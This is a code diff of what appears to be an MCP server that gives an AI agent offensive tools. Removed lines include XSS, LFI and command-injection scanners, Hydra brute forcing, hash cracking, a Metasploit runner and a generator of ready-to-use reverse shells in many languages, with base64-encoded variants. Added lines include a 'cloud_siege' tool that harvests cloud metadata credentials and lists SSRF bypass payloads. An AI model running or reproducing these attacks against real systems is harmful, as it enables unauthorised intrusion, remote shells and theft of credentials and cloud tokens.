-            cmd = ["curl", "-s", "-k", "--max-time", "10", "-X", "POST", "-d", td, url]
-        r = run_command_advanced(cmd, timeout=15)
-        response = r["stdout"]
-        reflected = payload in response or urllib.parse.unquote(encoded) in response
-        xss_ind = ["<script", "onerror=", "onload=", "javascript:", "alert(", "document."]
-        ind_found = any(i.lower() in response.lower() for i in xss_ind)
-        tr = {"payload": payload, "reflected": reflected, "indicator_found": ind_found,
-              "vulnerable": reflected and ind_found, "response_length": len(response),
-              "confidence": "high" if (reflected and ind_found) else ("medium" if reflected else "low")}
-        if tr["vulnerable"]:
-            tr["response_preview"] = response[:300]
-            vulnerable_payloads.append(tr)
-        results.append(tr)
-    
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": url, "parameter": param, "method": method,
-        "payloads_tested": len(payloads), "vulnerable": len(vulnerable_payloads) > 0,
-        "summary": {"total_tested": len(payloads), "reflected": len([r for r in results if r["reflected"]]),
-                     "vulnerable": len(vulnerable_payloads)},
-        "vulnerable_payloads": vulnerable_payloads, "all_results": results[:15]
-    }
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("xss_scan", target, output)
-    log_tool_execution("xss_scan", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-@mcp.tool()
-@resolve_references
-async def lfi_scan(url: str, param: str, custom_payloads: Optional[List[str]] = None, timeout: int = 300) -> str:
-    """Local File Inclusion (LFI) testing with encoding bypass techniques"""
-    target = url
-    trace, progress, exec_dir = _init_tool_context("lfi_scan", target, 3)
-    inputs = {"url": url, "param": param}
-    payloads = custom_payloads or PayloadGenerator.lfi_payloads()
-    results = []
-    vulnerable_payloads = []
-    file_indicators = {"passwd": ["root:x:0:0", "daemon:", "nobody:"], "hosts": ["127.0.0.1", "localhost"],
-                        "shadow": ["root:", "$6$", "$y$"], "config": ["[mysqld]", "DocumentRoot", "DB_PASSWORD"]}
-    
-    progress.update("Testing LFI payloads", f"{len(payloads)} payloads")
-    for payload in payloads:
-        test_url = f"{url}{'&' if '?' in url else '?'}{param}={urllib.parse.quote(payload)}"
-        cmd = ["curl", "-s", "-k", "--max-time", "10", "-A", "Mozilla/5.0", test_url]
-        r = run_command_advanced(cmd, timeout=15)
-        response_lower = r["stdout"].lower()
-        ftype = None
-        found = []
-        for ft, inds in file_indicators.items():
-            for ind in inds:
-                if ind.lower() in response_lower:
-                    ftype = ft
-                    found.append(ind)
-        vuln = len(found) > 0
-        tr = {"payload": payload, "vulnerable": vuln, "file_type": ftype, "indicators_found": found,
-              "response_length": len(r["stdout"]), "confidence": "high" if len(found) > 1 else ("medium" if vuln else "low")}
-        if vuln:
-            tr["response_preview"] = r["stdout"][:500]
-            vulnerable_payloads.append(tr)
-        results.append(tr)
-    
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": url, "parameter": param,
-        "payloads_tested": len(payloads), "vulnerable": len(vulnerable_payloads) > 0,
-        "summary": {"total_tested": len(payloads), "vulnerable": len(vulnerable_payloads),
-                     "file_types_found": list(set(r["file_type"] for r in vulnerable_payloads if r["file_type"]))},
-        "vulnerable_payloads": vulnerable_payloads, "all_results": results[:15]
-    }
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("lfi_scan", target, output)
-    log_tool_execution("lfi_scan", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-@mcp.tool()
-@resolve_references
-async def command_injection_test(
-    url: str, param: str, method: str = "GET", data: Optional[str] = None,
-    custom_payloads: Optional[List[str]] = None, timeout: int = 300
-) -> str:
-    """Command injection vulnerability testing with bypass techniques"""
-    target = url
-    trace, progress, exec_dir = _init_tool_context("command_injection_test", target, 3)
-    inputs = {"url": url, "param": param, "method": method}
-    payloads = custom_payloads or PayloadGenerator.command_injection_payloads()
-    results = []
-    vulnerable_payloads = []
-    cmd_indicators = {"whoami": ["root", "www-data", "apache", "nginx"],
-                       "id": ["uid=", "gid=", "groups="], "uname": ["Linux", "Darwin"],
-                       "passwd": ["root:x:0:0"], "ls": ["bin", "etc", "var"]}
-    
-    progress.update("Testing command injection payloads")
-    for payload in payloads:
-        encoded = urllib.parse.quote(payload)
-        if method.upper() == "GET":
-            test_url = f"{url}{'&' if '?' in url else '?'}{param}={encoded}"
-            cmd = ["curl", "-s", "-k", "--max-time", "15", test_url]
-        else:
-            td = f"{param}={encoded}"
-            if data: td = f"{data}&{td}"
-            cmd = ["curl", "-s", "-k", "--max-time", "15", "-X", "POST", "-d", td, url]
-        r = run_command_advanced(cmd, timeout=20)
-        response_lower = r["stdout"].lower()
-        found = []
-        for ct, inds in cmd_indicators.items():
-            for ind in inds:
-                if ind.lower() in response_lower: found.append(f"{ct}:{ind}")
-        vuln = len(found) > 0
-        tr = {"payload": payload, "vulnerable": vuln, "indicators_found": found,
-              "response_length": len(r["stdout"]),
-              "confidence": "high" if len(found) > 1 else ("medium" if vuln else "low")}
-        if vuln:
-            tr["response_preview"] = r["stdout"][:500]
-            vulnerable_payloads.append(tr)
-        results.append(tr)
-    
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": url, "parameter": param, "method": method,
-        "payloads_tested": len(payloads), "vulnerable": len(vulnerable_payloads) > 0,
-        "summary": {"total_tested": len(payloads), "vulnerable": len(vulnerable_payloads)},
-        "vulnerable_payloads": vulnerable_payloads, "all_results": results[:15]
-    }
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("command_injection_test", target, output)
-    log_tool_execution("command_injection_test", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
 
 
 # ============================================================================
-# BRUTE FORCE TOOLS
+# MODULE 7: CLOUD SIEGE
+# Replaces: cloud_storage_enum + NEW: AWS/GCS/Azure metadata, SSRF chains, IMDSv1/v2
 # ============================================================================
 
 @mcp.tool()
-@resolve_references
-async def hydra_attack(
+async def cloud_siege(
     target: str,
-    service: str = "ssh",
-    username: str = "",
-    username_list: str = "",
-    password_list: str = "",
-    port: int = 0,
-    threads: int = 4,
-    timeout: int = 300,
-    extra_args: str = ""
+    depth: str = "deep",
+    modules: str = "all",
+    cloud_provider: str = "auto",
+    region: str = "us-east-1",
+    timeout: int = 600,
 ) -> str:
     """
-    Professional brute force attack using Hydra with forensic tracing.
-    Supports: ssh, ftp, http-get, http-post-form, rdp, smb, mysql, vnc, telnet, pop3, imap, smtp.
+    Unified cloud attack engine. Combines: S3/GCS/Azure bucket enumeration,
+    metadata service exploitation (IMDSv1/v2), credential harvesting from SSRF,
+    cloud misconfiguration scanning.
+
+    cloud_provider: auto|aws|gcp|azure
+    modules: all | comma-separated: buckets,metadata,misconfig,ssrf_chain
     """
     target = InputValidator.sanitize_target(target)
-    timeout = InputValidator.validate_timeout(timeout, 600)
-    if port > 0:
-        port = InputValidator.validate_port(port)
-    trace, progress, exec_dir = _init_tool_context("hydra_attack", target, 6)
-    inputs = {"target": target, "service": service, "port": port, "threads": threads}
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("cloud_siege", target,
+                                                 {"depth": depth, "cloud_provider": cloud_provider})
+    results = {"target": target, "depth": depth, "cloud_provider": cloud_provider, "modules": {}}
 
-    progress.update("Validating parameters")
-    supported = ["ssh", "ftp", "http-get", "http-post-form", "rdp", "smb", "mysql",
-                 "vnc", "telnet", "pop3", "imap", "smtp", "snmp", "postgres", "mssql"]
-    if service not in supported:
-        output = {"status": "error", "message": f"Unsupported service: {service}. Supported: {supported}"}
-        log_tool_execution("hydra_attack", target, inputs, output, trace, progress)
-        return json.dumps(output, indent=2)
-
-    default_ports = {"ssh": 22, "ftp": 21, "rdp": 3389, "smb": 445, "mysql": 3306,
-                     "vnc": 5900, "telnet": 23, "pop3": 110, "imap": 143, "smtp": 25,
-                     "snmp": 161, "postgres": 5432, "mssql": 1433, "http-get": 80, "http-post-form": 80}
-    if port == 0:
-        port = default_ports.get(service, 22)
-
-    progress.update("Building Hydra command")
-    cmd = ["hydra", "-t", str(threads), "-s", str(port)]
-    if username:
-        cmd.extend(["-l", username])
-    elif username_list and os.path.exists(username_list):
-        cmd.extend(["-L", username_list])
-    else:
-        cmd.extend(["-l", "admin"])
-
-    if password_list and os.path.exists(password_list):
-        cmd.extend(["-P", password_list])
-    else:
-        default_pw = os.path.join(BASE_DIR, "payloads", "common_passwords.txt")
-        if os.path.exists(default_pw):
-            cmd.extend(["-P", default_pw])
-        else:
-            cmd.extend(["-p", "password"])
-
-    cmd.extend(["-o", os.path.join(exec_dir, "hydra_results.txt")])
-    if extra_args:
-        InputValidator.validate_command_args(extra_args)
-        cmd.extend(shlex.split(extra_args))
-    cmd.extend([target, service])
-
-    progress.update("Running Hydra attack")
-    trace.command(f"hydra {service}://{target}:{port}")
-    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
-
-    progress.update("Parsing results")
-    found_creds = []
-    for line in result["stdout"].split("\n"):
-        if "host:" in line.lower() and ("login:" in line.lower() or "password:" in line.lower()):
-            found_creds.append(line.strip())
-        elif re.match(r'^\[\d+\]\[', line):
-            found_creds.append(line.strip())
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": target, "service": service, "port": port,
-        "credentials_found": len(found_creds), "credentials": found_creds,
-        "raw_output_preview": result["stdout"][:2000],
-        "execution_time": result.get("execution_time", 0),
-        "severity": "CRITICAL" if found_creds else "info"
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("hydra_attack", target, output)
-    log_tool_execution("hydra_attack", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def john_crack(
-    hash_value: str = "",
-    hash_file: str = "",
-    hash_type: str = "auto",
-    wordlist: str = "",
-    rules: str = "",
-    timeout: int = 120
-) -> str:
-    """
-    Password hash cracking with John the Ripper. Supports MD5, SHA1, SHA256, SHA512, NTLM, bcrypt, etc.
-    """
-    target = hash_value[:32] if hash_value else os.path.basename(hash_file) if hash_file else "unknown"
-    trace, progress, exec_dir = _init_tool_context("john_crack", target, 6)
-    inputs = {"hash_type": hash_type, "has_hash_value": bool(hash_value), "has_hash_file": bool(hash_file)}
-
-    progress.update("Preparing hash input")
-    hash_path = os.path.join(exec_dir, "hashes.txt")
-    if hash_value:
-        with open(hash_path, "w") as f:
-            f.write(hash_value + "\n")
-    elif hash_file and os.path.exists(hash_file):
-        InputValidator.validate_file_path(hash_file)
-        hash_path = hash_file
-    else:
-        output = {"status": "error", "message": "Provide hash_value or hash_file"}
-        log_tool_execution("john_crack", target, inputs, output, trace, progress)
-        return json.dumps(output, indent=2)
-
-    progress.update("Building John command")
-    cmd = ["john"]
-    format_map = {
-        "md5": "raw-md5", "sha1": "raw-sha1", "sha256": "raw-sha256",
-        "sha512": "raw-sha512", "ntlm": "nt", "bcrypt": "bcrypt",
-        "mysql": "mysql-sha1", "mssql": "mssql", "lm": "lm"
-    }
-    if hash_type != "auto" and hash_type in format_map:
-        cmd.extend(["--format=" + format_map[hash_type]])
-    if wordlist and os.path.exists(wordlist):
-        cmd.extend(["--wordlist=" + wordlist])
-    elif os.path.exists("/usr/share/wordlists/rockyou.txt"):
-        cmd.extend(["--wordlist=/usr/share/wordlists/rockyou.txt"])
-    if rules:
-        cmd.extend(["--rules=" + rules])
-    cmd.append(hash_path)
-
-    progress.update("Cracking hashes")
-    trace.command(f"john --format={hash_type} {hash_path}")
-    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
-
-    progress.update("Retrieving results")
-    show_cmd = ["john", "--show", hash_path]
-    show_result = run_command_advanced(show_cmd, timeout=30, trace=trace)
-
-    cracked = []
-    for line in show_result["stdout"].split("\n"):
-        if ":" in line and not line.startswith("(") and line.strip():
-            cracked.append(line.strip())
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "hash_type": hash_type,
-        "cracked_count": len(cracked), "cracked_passwords": cracked,
-        "raw_output_preview": result["stdout"][:1500],
-        "show_output": show_result["stdout"][:1500],
-        "severity": "CRITICAL" if cracked else "info"
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("john_crack", target, output)
-    log_tool_execution("john_crack", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# EXPLOITATION TOOLS
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def metasploit_exploit(
-    target: str,
-    exploit_module: str = "",
-    payload: str = "",
-    lhost: str = "0.0.0.0",
-    lport: int = 4444,
-    options: str = "",
-    timeout: int = 120
-) -> str:
-    """
-    Execute Metasploit Framework exploits with forensic tracing. Generates RC files for reproducibility.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("metasploit_exploit", target, 7)
-    inputs = {"target": target, "exploit_module": exploit_module, "payload": payload, "lhost": lhost, "lport": lport}
-
-    progress.update("Checking Metasploit availability")
-    msf_check = run_command_advanced(["which", "msfconsole"], timeout=10, trace=trace)
-    if msf_check["return_code"] != 0:
-        output = {"status": "error", "message": "msfconsole not found. Install Metasploit Framework."}
-        log_tool_execution("metasploit_exploit", target, inputs, output, trace, progress)
-        return json.dumps(output, indent=2)
-
-    progress.update("Building RC script")
-    rc_path = os.path.join(exec_dir, "exploit.rc")
-    rc_lines = []
-    if exploit_module:
-        rc_lines.append(f"use {exploit_module}")
-        rc_lines.append(f"set RHOSTS {target}")
-        if payload:
-            rc_lines.append(f"set PAYLOAD {payload}")
-        rc_lines.append(f"set LHOST {lhost}")
-        rc_lines.append(f"set LPORT {lport}")
-        if options:
-            for opt in options.split(","):
-                opt = opt.strip()
-                if "=" in opt:
-                    rc_lines.append(f"set {opt}")
-        rc_lines.append("check")
-        rc_lines.append("exploit -j -z")
-    else:
-        rc_lines.append(f"db_nmap -sV {target}")
-        rc_lines.append(f"vulns")
-
-    rc_lines.append("exit -y")
-    with open(rc_path, "w") as f:
-        f.write("\n".join(rc_lines) + "\n")
-
-    progress.update("Executing Metasploit")
-    cmd = ["msfconsole", "-q", "-r", rc_path]
-    trace.command(f"msfconsole -q -r {rc_path}")
-    result = run_command_advanced(cmd, timeout=timeout, trace=trace)
-
-    progress.update("Parsing output")
-    sessions_found = []
-    vulns_found = []
-    for line in result["stdout"].split("\n"):
-        ll = line.lower()
-        if "session" in ll and ("opened" in ll or "created" in ll):
-            sessions_found.append(line.strip())
-        if "vulnerable" in ll or "exploited" in ll:
-            vulns_found.append(line.strip())
-
-    progress.update("Analysis")
-    output = {
-        "status": "success", "target": target, "exploit_module": exploit_module or "auto-scan",
-        "payload": payload, "rc_file": rc_path,
-        "sessions_opened": len(sessions_found), "sessions": sessions_found,
-        "vulnerabilities_found": vulns_found,
-        "raw_output_preview": result["stdout"][:3000],
-        "severity": "CRITICAL" if sessions_found else ("HIGH" if vulns_found else "info")
-    }
-
-    progress.update("Enrichment")
-    output = chain_engine.enrich_with_context("metasploit_exploit", target, output)
-    progress.update("Complete")
-    log_tool_execution("metasploit_exploit", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def reverse_shell_generator(
-    lhost: str,
-    lport: int = 4444,
-    shell_type: str = "bash",
-    encoding: str = "none",
-    platform: str = "linux"
-) -> str:
-    """
-    Generate reverse shell payloads for authorized penetration testing.
-    Types: bash, python, perl, php, nc, ruby, powershell, java, node, socat, msfvenom.
-    """
-    target = f"{lhost}:{lport}"
-    trace, progress, exec_dir = _init_tool_context("reverse_shell_generator", target, 5)
-    inputs = {"lhost": lhost, "lport": lport, "shell_type": shell_type, "encoding": encoding, "platform": platform}
-
-    progress.update("Generating payload")
-    shells = {
-        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
-        "bash_alt": f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
-        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
-        "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'",
-        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
-        "nc": f"nc -e /bin/sh {lhost} {lport}",
-        "nc_alt": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
-        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
-        "powershell": f"powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
-        "java": f"Runtime r=Runtime.getRuntime();Process p=r.exec(new String[]{{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read line;do $line 2>&5 >&5;done\"}});p.waitFor();",
-        "node": f"(function(){{var n=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new n.Socket();c.connect({lport},'{lhost}',function(){{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)}});}})();",
-        "socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
-    }
-
-    progress.update("Applying encoding")
-    primary = shells.get(shell_type, shells["bash"])
-    encoded_versions = {"raw": primary}
-    if encoding == "base64" or encoding == "all":
-        b64 = base64.b64encode(primary.encode()).decode()
-        encoded_versions["base64"] = f"echo {b64} | base64 -d | bash"
-    if encoding == "url" or encoding == "all":
-        encoded_versions["url_encoded"] = urllib.parse.quote(primary)
-    if encoding == "all":
-        encoded_versions["hex"] = primary.encode().hex()
-
-    progress.update("Generating listener command")
-    listeners = {
-        "nc": f"nc -lvnp {lport}",
-        "socat": f"socat file:`tty`,raw,echo=0 tcp-listen:{lport}",
-        "msfconsole": f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'"
-    }
-
-    progress.update("Building output")
-    output = {
-        "status": "success", "shell_type": shell_type, "lhost": lhost, "lport": lport,
-        "platform": platform, "payload": primary,
-        "encoded_versions": encoded_versions,
-        "all_shells": {k: v for k, v in shells.items()} if shell_type == "all" else {shell_type: primary},
-        "listeners": listeners,
-        "disclaimer": "AUTHORIZED TESTING ONLY. Unauthorized access is illegal."
-    }
-
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("reverse_shell_generator", target, output)
-    log_tool_execution("reverse_shell_generator", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-# ============================================================================
-# DNS & SUBDOMAIN TOOLS
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def subdomain_enum(
-    target: str,
-    methods: str = "all",
-    wordlist: str = "",
-    timeout: int = 180
-) -> str:
-    """
-    Comprehensive subdomain enumeration using multiple methods:
-    subfinder, amass, assetfinder, crt.sh, DNS brute force, chain enrichment.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("subdomain_enum", target, 8)
-    inputs = {"target": target, "methods": methods}
-
-    all_subdomains = set()
-    method_results = {}
-
-    # Method 1: crt.sh (passive, always run)
-    progress.update("crt.sh certificate transparency")
-    crt_cmd = ["curl", "-s", f"https://crt.sh/?q=%25.{target}&output=json"]
-    crt_result = run_command_advanced(crt_cmd, timeout=30, trace=trace)
-    crt_subs = set()
     try:
-        crt_data = json.loads(crt_result["stdout"])
-        for entry in crt_data:
-            name = entry.get("name_value", "")
-            for s in name.split("\n"):
-                s = s.strip().lower()
-                if s.endswith(f".{target}") or s == target:
-                    crt_subs.add(s)
-        all_subdomains.update(crt_subs)
-        method_results["crt_sh"] = {"count": len(crt_subs), "subdomains": sorted(crt_subs)[:100]}
-    except Exception:
-        method_results["crt_sh"] = {"count": 0, "error": "Parse error"}
+        mod_list = modules.split(",") if modules != "all" else ["buckets", "metadata", "misconfig", "ssrf_chain"]
+        delay = rate_limit_detector.get_delay(target)
 
-    # Method 2: subfinder
-    if methods in ["all", "subfinder"]:
-        progress.update("subfinder enumeration")
-        sf_out = os.path.join(exec_dir, "subfinder.txt")
-        sf_cmd = ["subfinder", "-d", target, "-silent", "-o", sf_out]
-        sf_result = run_command_advanced(sf_cmd, timeout=60, trace=trace)
-        sf_subs = set()
-        if os.path.exists(sf_out):
-            with open(sf_out) as f:
-                for line in f:
-                    s = line.strip().lower()
-                    if s:
-                        sf_subs.add(s)
-        else:
-            for line in sf_result["stdout"].split("\n"):
-                s = line.strip().lower()
-                if s and target in s:
-                    sf_subs.add(s)
-        all_subdomains.update(sf_subs)
-        method_results["subfinder"] = {"count": len(sf_subs), "subdomains": sorted(sf_subs)[:100]}
+        # Auto-detect cloud provider
+        if cloud_provider == "auto":
+            detect_result = await run_command(["curl", "-sk", "-I", target], timeout=10)
+            headers_text = detect_result.get("stdout", "").lower()
+            if "x-amz" in headers_text or "amazon" in headers_text:
+                cloud_provider = "aws"
+            elif "x-goog" in headers_text or "goog" in headers_text:
+                cloud_provider = "gcp"
+            elif "x-ms" in headers_text or "azure" in headers_text:
+                cloud_provider = "azure"
+            results["cloud_provider_detected"] = cloud_provider
 
-    # Method 3: amass
-    if methods in ["all", "amass"]:
-        progress.update("amass passive enumeration")
-        amass_cmd = ["amass", "enum", "-passive", "-d", target, "-timeout", "2"]
-        amass_result = run_command_advanced(amass_cmd, timeout=90, trace=trace)
-        amass_subs = set()
-        for line in amass_result["stdout"].split("\n"):
-            s = line.strip().lower()
-            if s and target in s:
-                amass_subs.add(s)
-        all_subdomains.update(amass_subs)
-        method_results["amass"] = {"count": len(amass_subs), "subdomains": sorted(amass_subs)[:100]}
+        # --- BUCKET ENUMERATION ---
+        if "buckets" in mod_list:
+            bucket_results = {"found": [], "accessible": []}
+            hostname = target.split("://")[-1].split("/")[0].split(":")[0]
+            base_names = hostname.replace(".", "-").split("-")
+            bucket_names = []
+            for name in base_names:
+                if len(name) > 2:
+                    for suffix in ["", "-dev", "-staging", "-prod", "-backup", "-assets",
+                                   "-uploads", "-static", "-media", "-data", "-logs",
+                                   "-config", "-private", "-public", "-internal"]:
+                        bucket_names.append(f"{name}{suffix}")
 
-    # Method 4: assetfinder
-    if methods in ["all", "assetfinder"]:
-        progress.update("assetfinder enumeration")
-        af_cmd = ["assetfinder", "--subs-only", target]
-        af_result = run_command_advanced(af_cmd, timeout=60, trace=trace)
-        af_subs = set()
-        for line in af_result["stdout"].split("\n"):
-            s = line.strip().lower()
-            if s and target in s:
-                af_subs.add(s)
-        all_subdomains.update(af_subs)
-        method_results["assetfinder"] = {"count": len(af_subs), "subdomains": sorted(af_subs)[:100]}
+            if cloud_provider in ["auto", "aws"]:
+                for bucket in bucket_names[:30]:
+                    for region_name in ["us-east-1", "us-west-2", "eu-west-1"]:
+                        check = await run_command(
+                            ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
+                             f"https://{bucket}.s3.{region_name}.amazonaws.com/"],
+                            timeout=8,
+                        )
+                        status = check.get("stdout", "").strip()
+                        if status and status != "000" and status != "404":
+                            bucket_results["found"].append({
+                                "name": bucket, "provider": "aws",
+                                "region": region_name, "status": int(status),
+                            })
+                            if status == "200":
+                                # Try list objects
+                                list_check = await run_command(
+                                    ["curl", "-sk", f"https://{bucket}.s3.{region_name}.amazonaws.com/"],
+                                    timeout=10,
+                                )
+                                if list_check.get("stdout") and "<Contents>" in list_check["stdout"]:
+                                    bucket_results["accessible"].append({
+                                        "name": bucket, "provider": "aws",
+                                        "listing": list_check["stdout"][:1000],
+                                    })
+                            break
+                    await asyncio.sleep(delay)
 
-    # Method 5: DNS brute force
-    if methods in ["all", "brute"]:
-        progress.update("DNS brute force")
-        common_prefixes = ["www", "mail", "ftp", "admin", "dev", "staging", "test", "api", "app",
-                          "portal", "vpn", "ns1", "ns2", "mx", "smtp", "pop", "imap", "blog",
-                          "shop", "store", "cdn", "static", "media", "assets", "img", "images",
-                          "docs", "wiki", "git", "jenkins", "ci", "cd", "monitor", "grafana",
-                          "prometheus", "kibana", "elastic", "redis", "db", "mysql", "postgres",
-                          "mongo", "s3", "backup", "internal", "intranet", "extranet", "sso",
-                          "auth", "login", "oauth", "webmail", "remote", "cloud", "k8s"]
-        dns_subs = set()
-        for prefix in common_prefixes:
-            subdomain = f"{prefix}.{target}"
+            if cloud_provider in ["auto", "gcp"]:
+                for bucket in bucket_names[:20]:
+                    check = await run_command(
+                        ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
+                         f"https://storage.googleapis.com/{bucket}/"],
+                        timeout=8,
+                    )
+                    status = check.get("stdout", "").strip()
+                    if status and status != "000" and status != "404":
+                        bucket_results["found"].append({
+                            "name": bucket, "provider": "gcp", "status": int(status),
+                        })
+                    await asyncio.sleep(delay)
+
+            if cloud_provider in ["auto", "azure"]:
+                for bucket in bucket_names[:20]:
+                    check = await run_command(
+                        ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
+                         f"https://{bucket}.blob.core.windows.net/?comp=list"],
+                        timeout=8,
+                    )
+                    status = check.get("stdout", "").strip()
+                    if status and status != "000" and status != "404":
+                        bucket_results["found"].append({
+                            "name": bucket, "provider": "azure", "status": int(status),
+                        })
+                    await asyncio.sleep(delay)
+
+            results["modules"]["buckets"] = bucket_results
+            if bucket_results["found"]:
+                pentest_memory.store_finding(target, "cloud_siege", "cloud_buckets",
+                                             {"count": len(bucket_results["found"])})
+
+        # --- METADATA SERVICE ---
+        if "metadata" in mod_list:
+            meta_results = {"accessible": False, "credentials": {}, "metadata": {}}
+
+            metadata_endpoints = {
+                "aws_imdsv1": {
+                    "url": "http://169.254.169.254/latest/meta-data/",
+                    "headers": {},
+                    "sensitive": [
+                        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                        "http://169.254.169.254/latest/user-data",
+                        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
+                    ],
+                },
+                "aws_imdsv2": {
+                    "token_url": "http://169.254.169.254/latest/api/token",
+                    "token_header": "X-aws-ec2-metadata-token-ttl-seconds: 21600",
+                },
+                "gcp": {
+                    "url": "http://metadata.google.internal/computeMetadata/v1/",
+                    "headers": {"Metadata-Flavor": "Google"},
+                    "sensitive": [
+                        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                        "http://metadata.google.internal/computeMetadata/v1/project/attributes/",
+                    ],
+                },
+                "azure": {
+                    "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                    "headers": {"Metadata": "true"},
+                    "sensitive": [
+                        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+                    ],
+                },
+            }
+
+            # These are SSRF payloads to use when testing internal endpoints
+            # For direct metadata testing (from inside cloud):
+            for provider, config in metadata_endpoints.items():
+                if "url" in config:
+                    curl_args = ["curl", "-sk", "--max-time", "5", config["url"]]
+                    for k, v in config.get("headers", {}).items():
+                        curl_args.extend(["-H", f"{k}: {v}"])
+                    result = await run_command(curl_args, timeout=8)
+                    if result.get("success") and result.get("stdout") and len(result["stdout"]) > 10:
+                        meta_results["accessible"] = True
+                        meta_results["metadata"][provider] = result["stdout"][:2000]
+
+                        # Fetch sensitive endpoints
+                        for sensitive_url in config.get("sensitive", []):
+                            sens_args = ["curl", "-sk", "--max-time", "5", sensitive_url]
+                            for k, v in config.get("headers", {}).items():
+                                sens_args.extend(["-H", f"{k}: {v}"])
+                            sens_result = await run_command(sens_args, timeout=8)
+                            if sens_result.get("success") and sens_result.get("stdout"):
+                                meta_results["credentials"][provider] = sens_result["stdout"][:2000]
+
+            # SSRF-ready payloads for use with ssrf_hunter module
+            meta_results["ssrf_payloads"] = {
+                "aws": [
+                    "http://169.254.169.254/latest/meta-data/",
+                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                    "http://[::ffff:169.254.169.254]/latest/meta-data/",
+                    "http://169.254.169.254.xip.io/latest/meta-data/",
+                    "http://2852039166/latest/meta-data/",  # decimal IP
+                    "http://0xA9FEA9FE/latest/meta-data/",  # hex IP
+                ],
+                "gcp": [
+                    "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
+                    "http://169.254.169.254/computeMetadata/v1/?recursive=true",
+                ],
+                "azure": [
+                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                    "http://169.254.169.254/metadata/identity/oauth2/token",
+                ],
+            }
+            results["modules"]["metadata"] = meta_results
+
+        # --- CLOUD MISCONFIGURATION ---
+        if "misconfig" in mod_list:
+            misconfig_results = {"findings": []}
+            # Check for public snapshots, security groups, etc.
+            checks = [
+                ("Public S3 policy", f"https://{target}.s3.amazonaws.com/?policy"),
+                ("S3 ACL", f"https://{target}.s3.amazonaws.com/?acl"),
+                ("Azure public blob", f"https://{target}.blob.core.windows.net/$web/index.html"),
+            ]
+            for check_name, check_url in checks:
